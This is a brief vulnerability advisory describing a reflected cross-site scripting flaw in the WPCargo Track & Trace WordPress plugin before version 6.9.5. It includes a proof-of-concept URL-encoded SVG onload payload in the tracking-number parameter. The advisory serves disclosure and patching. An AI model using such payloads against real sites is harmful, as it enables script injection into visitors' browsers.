## WordPress Plugin Vulnerabilities

# WPCargo Track & Trace < 6.9.5 - Reflected Cross Site Scripting

### Description

The plugin does not sanitise and escape the wpcargo\_tracking\_number parameter before outputting it back in the page, which could allow attackers to perform reflected Cross-Site Scripting attacks.

### Proof of Concept

On a page using the [wpcargo\_trackform] shortcode, append the following parameter and payload: wpcargo\_tracking\_number=%22%3E%3Csvg/onload=alert(/xss/)%3E
e.g: https://example.com/page-with-shortcode/?wpcargo\_tracking\_number=%22%3E%3Csvg/onload=alert(/xss/)%3E
